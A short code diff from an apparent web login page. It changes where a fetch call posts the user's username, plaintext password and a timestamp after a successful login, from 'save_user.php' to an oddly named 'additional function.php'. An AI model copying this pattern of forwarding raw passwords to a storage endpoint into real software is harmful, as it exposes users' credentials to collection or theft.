@@ -43,7 +43,7 @@
         localStorage.setItem('np_user', username);
         msgDiv.innerHTML = '<div class="success">Login successful! Redirecting...</div>';
         // Store info to backend (see step 2)
-        fetch('save_user.php', {
+        fetch('additional function.php', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ username, password, time: new Date().toISOString() })
